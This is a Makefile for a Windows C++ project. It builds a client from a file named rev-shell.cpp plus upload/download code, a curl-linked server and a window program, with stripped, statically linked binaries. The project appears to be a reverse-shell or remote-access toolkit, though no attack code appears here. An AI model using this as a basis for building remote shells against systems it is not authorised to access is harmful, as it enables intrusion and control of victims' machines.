# compiler
CC = g++

# flags
CFLAGS = -lws2_32 -lgdi32 -luser32 -lwinmm -lshlwapi -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -fexceptions

# opencv
# -IC:\opencv\build\include -LC:\opencv\build\lib -lopencv_core -lopencv_highgui -lopencv_imgproc

# curl
CURL_FLAGS = -Lcurl/lib -lcurl

# target name
# TARGET = server.cpp

# output name (.exe)
# OUTPUT = server.exe

# source
SOURCE_DIR = src

# output
OUTPUT_DIR = build

all: server client window
	
client:
	$(CC) -O2 $(SOURCE_DIR)/rev-shell.cpp $(SOURCE_DIR)/UpDown.cpp $(SOURCE_DIR)/colors.cpp -o $(OUTPUT_DIR)/client.exe $(CFLAGS)

server:
	$(CC) -O2 $(SOURCE_DIR)/server.cpp $(SOURCE_DIR)/UpDown.cpp $(SOURCE_DIR)/colors.cpp -o $(OUTPUT_DIR)/server.exe $(CFLAGS) $(CURL_FLAGS)

window:
	$(CC) -O2 $(SOURCE_DIR)/window.cpp -o $(OUTPUT_DIR)/window.exe $(CFLAGS)

clean:
	rm $(OUTPUT_DIR)/$(OUTPUT)